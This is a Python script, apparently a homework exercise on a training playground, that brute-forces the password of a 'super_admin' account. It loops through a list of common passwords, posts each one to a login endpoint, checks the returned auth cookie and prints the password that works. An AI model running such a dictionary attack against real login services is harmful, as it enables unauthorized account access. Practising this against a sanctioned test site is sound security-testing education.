import  requests

# Подбор пароля

top_passwords = ['123456', '123456789', 'qwerty', 'password', '1234567', '12345678', '12345', 'iloveyou', '111111',
                '123123', 'abc123', 'qwerty123', '1q2w3e4r' , 'admin', 'qwertyuiop', '654321', '555555', 'lovely',
                '7777777', 'welcome', '888888', 'princess', 'dragon', 'password1', '123qwe']

# 1.Брать очередной пароль и вместе с логином коллеги вызывать первый метод get_secret_password_homework.
# В ответ метод будет возвращать авторизационную cookie с именем auth_cookie и каким-то значением.

for element_password in top_passwords:
    payload = {"login": "super_admin", "password": element_password}
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    # print(dict(response.cookies))

    cookie_value = response.cookies.get('auth_cookie')

    # 2. Далее эту cookie мы должна передать во второй метод check_auth_cookie.
    # Если в ответ вернулась фраза "You are NOT authorized", значит пароль неправильный.
    # В этом случае берем следующий пароль и все заново.
    # Если же вернулась другая фраза - нужно, чтобы программа вывела верный пароль и эту фразу.

    cookies = {}
    if cookie_value is not None:
        cookies.update({"auth_cookie": cookie_value})

    response = requests.post("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)
    try:
        assert response.text == 'You are NOT authorized',f"{response.text} password: {element_password}"

    except AssertionError:
        print(f"password: {element_password}  {response.text}")


